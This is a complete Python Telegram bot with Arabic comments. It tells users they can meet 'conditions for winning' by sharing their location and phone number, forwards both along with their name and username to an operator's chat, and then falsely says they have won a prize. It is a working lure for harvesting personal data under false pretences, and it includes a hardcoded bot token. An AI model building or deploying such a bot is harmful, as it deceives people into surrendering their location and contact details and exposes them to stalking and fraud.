import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# إعداد السجلات لمتابعة عمل البوت
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

# توكن البوت الخاص بك
TOKEN = "8690867763:AAHZLpFhevbDCz5Rg8eoZjY5VVkFPGTKg8M"

# ضع هنا رقم معرفك (Chat ID) الخاص بك على تيليجرام لكي تصلك البيانات عليه (استبدل الصفر برقمك)
ADMIN_CHAT_ID = 0  

# أمر البدء: يظهر زر مزدوج يطلب الموقع ورقم الهاتف في خطوة واحدة
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # إنشاء زر لمشاركة الموقع وزر لمشاركة رقم الهاتف معاً
    location_button = KeyboardButton(text="📍 مشاركة الموقع الجغرافي", request_location=True)
    contact_button = KeyboardButton(text="📱 مشاركة رقم الهاتف", request_contact=True)
    
    # وضعهما في لوحة مفاتيح واحدة تظهر للمستخدم
    reply_markup = ReplyKeyboardMarkup(
        [[location_button], [contact_button]], 
        resize_keyboard=True, 
        one_time_keyboard=True
    )
    
    await update.message.reply_text(
        "أهلاً بك! لتحقيق شروط الربح والمتابعة، يرجى تزويدنا بالموقع ورقم الهاتف عبر الأزرار أدناه 👇",
        reply_markup=reply_markup
    )

# دالة استقبال رقم الهاتف
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if contact:
        user = update.effective_user
        phone = contact.phone_number
        
        if ADMIN_CHAT_ID != 0:
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"📞 تم استلام رقم هاتف جديد!\n👤 الاسم: {user.first_name}\n🆔 المعرف: @{user.username}\n📱 الرقم: {phone}"
                )
            except Exception as e:
                print(f"Error sending contact to admin: {e}")
                
        await update.message.reply_text("تم استلام رقم هاتفك بنجاح 📱✅")

# دالة استقبال الموقع الجغرافي
async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    location = update.message.location
    if location:
        user = update.effective_user
        lat = location.latitude
        lon = location.longitude
        
        if ADMIN_CHAT_ID != 0:
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"📍 تم استلام موقع جديد!\n👤 الاسم: {user.first_name}\n🆔 المعرف: @{user.username}\n🌐 الإحداثيات: {lat}, {lon}"
                )
                await context.bot.send_location(chat_id=ADMIN_CHAT_ID, latitude=lat, longitude=lon)
            except Exception as e:
                print(f"Error sending location to admin: {e}")
                
        await update.message.reply_text(
            "🎉 **تمت عملية التحقق بنجاح!**\n\n"
            "شكراً لتفاعلكم. لقد ربحت الجائزة/الرصيد معنا بنجاح!"
        )

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    # أمر البدء
    app.add_handler(CommandHandler("start", start_command))
    
    # معالجة استلام رقم الهاتف
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    
    # معالجة استلام الموقع الجغرافي
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))

    app.run_polling()

if __name__ == "__main__":
    main()
